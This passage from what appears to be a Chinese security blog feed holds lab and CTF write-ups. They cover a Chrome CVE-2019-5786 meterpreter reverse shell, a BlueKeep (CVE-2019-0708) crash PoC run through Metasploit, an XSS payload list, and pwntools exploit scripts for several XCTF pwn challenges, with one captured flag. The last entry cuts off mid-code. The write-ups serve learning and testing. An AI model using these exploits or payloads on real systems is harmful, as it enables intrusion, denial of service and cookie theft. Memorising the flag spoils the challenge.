windows/meterpreter/reverse_tcp</code></p><p><img src="https://i.loli.net/2020/05/25/bNlUIHPxwkXcsrn.png" alt="捕获.PNG"></p><p>启动服务：run 或者exploit</p><p>在win7下进入chrome文件目录，在目录下进去cmd，并以沙箱关闭状态执行chrome.exe</p><pre><code class="hljs">-&gt; chrome.exe --no-sandbox</code></pre><p>在弹出的chome浏览器中访问kali ip: <a href="http://192.168.119.128:8080/">http://192.168.119.128:8080</a></p><p>kali获得sessions<br>查看sessions序号，通过反弹shell在win7上可执行命令。<br>复现结束。</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>在获取session时候我遇见了很多小问题导致我不能获取，比如win7应该是x86系统，比如win7的防火墙忘记关闭了，比如网速太慢，在历经无数崩溃瞬间我成功的获取了session.<br>虽然后来再整理wp的时候，win7系统由于自动更新，chrome119版本也升级了，后来再安装却死活安装不上去，差点升天……</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>exp太长了并且看不懂，等我后面有机会再整理。这边放其他大佬整理出来的exp。</p><pre><code class="hljs">https://github.com/exodusintel/CVE-2019-5786 </code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>chrome_bug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2019-0708</title>
    <link href="/2022/08/09/CVE-2019-0708/"/>
    <url>/2022/08/09/CVE-2019-0708/</url>
    
    <content type="html"><![CDATA[<p>2019年5月14日爆出CVE-2019-0708漏洞，高危漏洞，影响范围较广，通过远程桌面端口3389，RDP协议进行攻击。</p><p>影响系统：windows 2003、windows 2008、windows 2008 R2、windows xp、win7</p><h1 id="蓝屏"><a href="#蓝屏" class="headerlink" title="蓝屏"></a>蓝屏</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：kali IP：192.168.119.128</p><p>靶机：win7 IP:192.168.119.139 (开放3389端口)</p><p>工具：RDP漏洞扫描工具、MSF</p><p>POC：<a href="https://github.com/n1xbyte/CVE-2019-0708">https://github.com/n1xbyte/CVE-2019-0708</a></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>nmap对win7端口扫描:</p><p><img src="https://i.loli.net/2020/07/13/Agj1dU2GY5JKZnW.png" alt="nmap扫描3389.PNG"></p><p>RDP工具在win7上扫描靶机:<code>0708detector.exe -t 192.168.119.139 -p 3389</code></p><p><img src="https://i.loli.net/2020/07/13/CwHJ1PRnel7cyu5.png" alt="漏扫工具扫描3389（win7自身）.PNG"></p><p>启动MSF<br>查找漏洞： <code>search 0708</code></p><p>利用漏洞扫描模块： <code>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</code></p><p>查看参数： <code>show options</code></p><p>设置靶机IP： <code>set rhosts 192.168.119.139</code></p><p>运行：<code>run</code></p><h3 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h3><p>在kali中安装pip3,安装impacket库。下载poc。<br>切进目录CVE-2019-0708</p><p>开始攻击： <code>python3 crashpoc.py 192.168.119.139 64(系统类型)</code></p><p>攻击成功，win7变为蓝屏。</p><p><img src="https://i.loli.net/2020/07/13/UN9urvOaMQxEDoC.png" alt="win7蓝屏.PNG"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h4 id="RDP协议"><a href="#RDP协议" class="headerlink" title="RDP协议"></a>RDP协议</h4><p>RDP,远程显示协议。传输方式：tcp/ip。提供了客户和服务器之间的连接。映像会话。<br>基本层次结构：</p><ul><li>网络连接层：RDP协议建立在tcp/ip协议之上，由于传输的数据量比较大，因此在协议的底层首先定义一层网络连接层，它定义了一个完整的RDP数据逻辑包，以避免由于网络包长度过长而被分割使数据丢失。</li><li>ISO数据层：在网络连接层之上是ISO数据层，标识RDP数据的正常连接通信。</li><li>虚拟通道层：在ISO数据层之上，RDP协议定义一个虚拟通道层，用以拆分标示不同虚拟通道的数据，加快客户端处理速度，节省占用网络接口的时间。</li><li>加密解密层：在虚拟通道层之上，RDP定义一个数据加密解密层，此层用于对所有的功能数据进行加密解密处理。</li><li>功能数据层：在加密解密层之上是功能数据，画面信息，本地资源转换，声音数据，打印数据等所有的功能数据信息都在此层进行处理。另外，根据数据类型的不同，这些数据都有各自不同层次的分割，</li></ul><p>连接过程说明：</p><ul><li>客户端连接服务器</li><li>ISO数据层建立连接</li><li>发送初始协议相关信息，接收加密、解密秘钥</li><li>虚拟通道申请</li><li>加密形式发送客户端系统信息，同时验证加密协议</li><li>平台软件证书验证</li><li>各功能建立连接，各功能数据传输，功能实现。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>windows漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-pwn-反应釜开关控制</title>
    <link href="/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/"/>
    <url>/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec:"></a>checksec:</h2><p><img src="https://i.loli.net/2020/07/15/3D5qjSLvGN2CJzT.png" alt="checksec.PNG"></p><ul><li>可以修改GOT表</li><li>可以通过一处的方式来更改程序运行流</li><li>堆栈不可执行</li><li>地址随机化未开启</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>IDA查看，发现有/bin/sh。</p><p><img src="https://i.loli.net/2020/07/15/wLf32ASzvt5brWm.png" alt="shell.PNG"></p><p>get函数可溢出，偏移由v5得0x200h+0x8h(偏移对齐)=0x208h</p><p><img src="https://i.loli.net/2020/07/15/9mZH7GCz2u8LJq5.png" alt="v5.PNG"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>exp:</p><p><code> from pwn import * r = remote('220.249.52.133',39331) elf = ELF('./control') shell_addr = 0x04005F6 payload = 'A'*0x208 + p64(shell_addr) r.sendline(payload) r.interactive()</code></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>看了一下大佬的wp，结果原来是盲打题……</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>有关XSS跨站脚本</title>
    <link href="/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/"/>
    <url>/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS-跨站脚本-原理与分类"><a href="#XSS-跨站脚本-原理与分类" class="headerlink" title="XSS(跨站脚本)原理与分类"></a>XSS(跨站脚本)原理与分类</h1><p>跨站脚本攻击XSS,为了不和层叠样式表的缩写混淆，故将跨站脚本攻击缩写为XSS,恶意攻击者往web页面里插入恶意script代码，当用户浏览页面时嵌入其中的script代码被执行，从而恶意攻击用户。</p><p>XSS攻击针对的是用户层面的攻击.</p><ul><li>反射型：交互的数据一般不会被存在数据库里，一次性，一般出现在查询页面等。</li><li>存储型：交互的数据会被存在数据库里面，永久性存储，一般出现在留言板，注册等页面。</li><li>DOM型：不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，一次性，也属于反射型。</li></ul><h1 id="XSS漏洞测试流程"><a href="#XSS漏洞测试流程" class="headerlink" title="XSS漏洞测试流程"></a>XSS漏洞测试流程</h1><p>1.在目标上找输入点，比如查询接口、留言板</p><p>2.输入一组“特殊字符（&gt;,’,”等）+唯一识别字符”，点击提交后，查看返回源码，看后端返回数据是否有处理。</p><p>3.通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的调教（构造闭合）</p><p>4.提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，成功执行证明存在xss漏洞。</p><h1 id="XSS的攻击载荷"><a href="#XSS的攻击载荷" class="headerlink" title="XSS的攻击载荷"></a>XSS的攻击载荷</h1><ul><li><code>&lt;script&gt;</code>：最直接的xss有效载荷，脚本标记可以引用外部的javascript代码，也可以将代码插入脚本标记中。</li></ul><figure class="highlight plaintext"><figcaption><span>src</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs <script">&lt;script&gt;alert("hack")&lt;/script&gt; #弹出hack<br>&lt;script&gt;alert(document.cookie)&lt;/script&gt; #弹出cookie<br></code></pre></td></tr></tbody></table></figure><ul><li><code>&lt;img&gt;</code>：<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert("hack")&gt;<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(/hack/)&gt;<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;  #弹出cookie<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(123)&gt;      注：对于数字，可以不用引号<br>&lt;img  <span class="hljs-attribute">src</span>=<span class="hljs-string">"javascript:alert("</span>XSS");"&gt;<br>&lt;img  <span class="hljs-attribute">dynsrc</span>=<span class="hljs-string">"javascript:alert('XSS')"</span>&gt;<br>&lt;img  <span class="hljs-attribute">lowsrc</span>=<span class="hljs-string">"javascript:alert('XSS')"</span>&gt;<br></code></pre></td></tr></tbody></table></figure></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-dice_game</title>
    <link href="/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/"/>
    <url>/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-Checksec"><a href="#0x01-Checksec" class="headerlink" title="0x01 Checksec"></a>0x01 Checksec</h2><p>linux下checksec查壳，开启了relro nx pie防护：</p><p><img src="https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png" alt="pwn-checksec.PNG"></p><h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>IDA打开，主函数：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">55</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h]</span><br>  <span class="hljs-type">char</span> v5; <span class="hljs-comment">// [rsp+37h] [rbp-19h]</span><br>  <span class="hljs-type">ssize_t</span> v6; <span class="hljs-comment">// [rsp+38h] [rbp-18h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> seed[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [rsp+4Ch] [rbp-4h]</span><br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>uLL);<br>  *(_QWORD *)seed = <span class="hljs-built_in">time</span>(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Welcome, let me know your name: "</span>, a2);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  v6 = <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x50</span>uLL);<br>  <span class="hljs-keyword">if</span> ( v6 &lt;= <span class="hljs-number">49</span> )<br>    buf[v6 - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hi, %s. Let's play a game.\n"</span>, buf);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  <span class="hljs-built_in">srand</span>(seed[<span class="hljs-number">0</span>]);<br>  v8 = <span class="hljs-number">1</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Game %d/50\n"</span>, v8);<br>    v5 = <span class="hljs-built_in">sub_A20</span>();<br>    <span class="hljs-built_in">fflush</span>(stdout);<br>    <span class="hljs-keyword">if</span> ( v5 != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( v5 )<br>    {<br>      <span class="hljs-keyword">if</span> ( v8 == <span class="hljs-number">50</span> )<br>      {<br>        <span class="hljs-built_in">sub_B28</span>(buf);<br>        <span class="hljs-keyword">break</span>;<br>      }<br>      ++v8;<br>    }<br>  }<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Bye bye!"</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>是一个srand函数程序，输入与随机出来的数匹配，则将进入flag的函数。</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">sub_B28</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> s; <span class="hljs-comment">// [rsp+10h] [rbp-70h]</span><br>  FILE *stream; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Congrats %s\n"</span>, a1);<br>  stream = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">"flag"</span>, <span class="hljs-string">"r"</span>);<br>  <span class="hljs-built_in">fgets</span>(&amp;s, <span class="hljs-number">100</span>, stream);<br>  <span class="hljs-built_in">puts</span>(&amp;s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">fflush</span>(stdout);<br>}<br></code></pre></td></tr></tbody></table></figure><p>在输入name时，令输入数据覆盖srand函数内部随机种子，就可以控制随机数的生成。</p><p><img src="https://i.loli.net/2020/07/23/fxEhB6bCWcH9enR.png" alt="相差40.PNG"></p><p>随机树种子地址与输入名字的buf地址之间相差0x40,所以将seed覆盖掉</p><h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> ctypes import *<br><span class="hljs-attribute">p</span>=remote('220.249.52.133',34691)<br><span class="hljs-attribute">libc</span>=cdll.LoadLibrary("libc.so.6")<br>p.recv()<br><span class="hljs-attribute">payload</span>=0x40*'a'+p64(0)<br>p.sendline(payload)<br>a=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(50):<br>    a.append(libc.rand()%6+1)<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    p.recv()<br>    <span class="hljs-built_in">print</span>(p.recv())<br>    p.sendline(str(i))<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界 string</title>
    <link href="/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/"/>
    <url>/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/</url>
    
    <content type="html"><![CDATA[<p>checksec 查看保护机制</p><p><img src="https://i.loli.net/2020/05/08/lbkP9F8xrwtuTWC.png" alt="捕获.PNG"></p><p>注：开启Full RELRO，无法修改got表；开启Canary found，不能直接用溢出方法覆盖栈中返回地址，要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过；开启NX,意味着栈中数据没有执行权限；PIE未开启，基地址不会变化，为0x400000.</p><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>IDA64查看，在sub_400CA6()中发现：v1被强制转换成函数指针类型。</p><p><img src="https://i.loli.net/2020/05/08/4sSQG3NBDWnR7Jw.png" alt="17627983-1901e053361f6609.png"></p><blockquote><p>注：<code> ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</code> 就是将v1强制转换为一个函数指针</p></blockquote><p>其满足条件为 a1==a1[1]，回溯发现，a1为函数sub_400D72()函数的参数，即，a1为v5.</p><p><img src="https://i.loli.net/2020/05/08/zpABrQvk81ThUoe.png" alt="17627983-161d0aad17e6e884.png"></p><p>可看出，v4=v5,且*v4=68;v4[1]=85;也就是说，a1=68,a1[1]=85.所以我们要修改a1值令a1=85</p><p>按流程分析：<br>在sub_400A7D()中，满足s1==“east”，则跳出函数。</p><p>在sub_400BB9()中发现格式化字符串漏洞（可以进行任意地址改写）</p><p><img src="https://i.loli.net/2020/05/08/DzEihSeIblU8uFA.png" alt="17627983-6cdde7e8a076f299.png"></p><p><code>printf(&amp;format, &amp;format);</code></p><p>通过此处可修改v4[0]值，现在需要确定v4[0]地址。在main()函数中，打印的secret[0]正是v5,即v4[0]地址。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>通过格式化字符串漏洞赋值a1为85，使if条件成真，执行我们传入的shellcode拿到shell。</p><blockquote><p>函数调用约定：linux_x64下，参数从左到右放入寄存器：RDI,RSI,RDX,ECX,R8,R9,当参数为7个以上时，前面6个与前面一样，但后面的以此从“右向左”放入栈中。</p></blockquote><blockquote><p>利用pwntools自带的shellcodecraft工具，生成amd64架构下的shellcode，拿到shell.</p></blockquote><blockquote><p>Pwntools  shellcraft模块：是shellcode的模块，包含一些生成shellcode的函数，子模块声明架构（如：shellcode.arm是ARm架构；shellcraft.amd64是AMD64架构；shellcraft.common是所有架构通用）</p></blockquote><p><code>printf(shellcraft.sh())  #打印出shellcode</code><br><code>printf(asm(shellcraft.sh()))  #打印出汇编后的shellcode</code></p><p>用gdb调试程序，在printf下断点，输入%x测试，发现输出如图：</p><p><img src="https://i.loli.net/2020/05/08/pYcXRjQuOKesnf6.png" alt="17627983-fe71239050c56166.png"></p><p>填写address时我输入的是56（0x38），也就是[rsp+16]的位置，即格式化字符串的第7个参数（printf的第8个参数）</p><blockquote><p>conext.log_level=”debug”  脚本在执行时输出debug的信息，可以通过观察这些信息查找哪步出错</p></blockquote><p>补：<br>之前不知道sh.recv(7),16是什么意思，现在补充，就是sendline自带换行符，所以要把\n过滤掉，7是因为v3就是打印的6个书，换行符是第7位，16代表十六进制。</p><p><img src="https://i.loli.net/2020/05/08/b82ZR5pS9hPd4FK.png" alt="17627983-56395b2513720994.png"></p><p>exp：</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br> #<span class="hljs-attribute">sh</span>=process('./string')<br><span class="hljs-attribute">sh</span>=remote('111.198.29.45',36129)<br>context.<span class="hljs-attribute">log_level</span>=<span class="hljs-string">'debug'</span><br>sh.recvuntil(<span class="hljs-string">'secret[0] is'</span>)<br><span class="hljs-attribute">v3_addr</span>=int(sh.recv(7),16)<br>sh.recvuntil(<span class="hljs-string">'name be:'</span>)<br>sh.sendline(<span class="hljs-string">'zzz'</span>)<br>sh.recvuntil(<span class="hljs-string">'east or up?:'</span>)<br>sh.sendline(<span class="hljs-string">'east'</span>)<br>sh.recvuntil(<span class="hljs-string">'leave(0)?:'</span>)<br>sh.sendline(<span class="hljs-string">'1'</span>)<br>sh.recvuntil(<span class="hljs-string">'\'</span>Give me an address\<span class="hljs-string">''</span>)<br>sh.sendline(str(v3_addr))<br>sh.recvuntil(<span class="hljs-string">'you wish is:'</span>)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">'%085c'</span>+'%7$n'<br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">'I will help you! USE YOU SPELL'</span>)<br>sh.sendline(asm(shellcraft.amd64.linux.sh(),<span class="hljs-attribute">arch</span>=<span class="hljs-string">"amd64"</span>))<br>sh.interactive()<br></code></pre></td></tr></tbody></table></figure><p>cyberpeace{962a040a22938025e2ad4bbe3e5b56d3}</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-pwn-stack2</title>
    <link href="/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/"/>
    <url>/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>checksec检查：</p><p><img src="https://i.loli.net/2020/07/27/seUw8f5zIvPk9W7.png" alt="捕获.PNG"></p><p>32位，无PIE，开了NX和canary.<br>运行一下是只有五个模块，展示数字，添加，更改，求平均数，退出。</p><p>IDA中查看main函数：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+18h] [ebp-90h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp+1Ch] [ebp-8Ch]</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [esp+20h] [ebp-88h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> j; <span class="hljs-comment">// [esp+24h] [ebp-84h]</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [esp+28h] [ebp-80h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+2Ch] [ebp-7Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> k; <span class="hljs-comment">// [esp+30h] [ebp-78h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> l; <span class="hljs-comment">// [esp+34h] [ebp-74h]</span><br>  <span class="hljs-type">char</span> v13[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+38h] [ebp-70h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v14; <span class="hljs-comment">// [esp+9Ch] [ebp-Ch]</span><br>  v14 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  v9 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"***********************************************************"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"*                      An easy calc                       *"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"*Give me your numbers and I will return to you an average *"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"*(0 &lt;= x &lt; 256)                                           *"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"***********************************************************"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"How many numbers you have:"</span>);<br>  __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v5);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Give me your numbers"</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v5 &amp;&amp; (<span class="hljs-type">signed</span> <span class="hljs-type">int</span>)i &lt;= <span class="hljs-number">0x63</span>; ++i )<br>  {<br>    __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v7);<br>    v13[i] = v7;<br>  }<br>  <span class="hljs-keyword">for</span> ( j = v5; ; <span class="hljs-built_in">printf</span>(<span class="hljs-string">"average is %.2lf\n"</span>, (<span class="hljs-type">double</span>)((<span class="hljs-type">long</span> <span class="hljs-type">double</span>)v9 / (<span class="hljs-type">double</span>)j)) )<br>  {<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    {<br>      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>      {<br>        <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>        {<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span>);<br>          __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v6);<br>          <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">2</span> )<br>            <span class="hljs-keyword">break</span>;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Give me your number"</span>);<br>          __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v7);<br>          <span 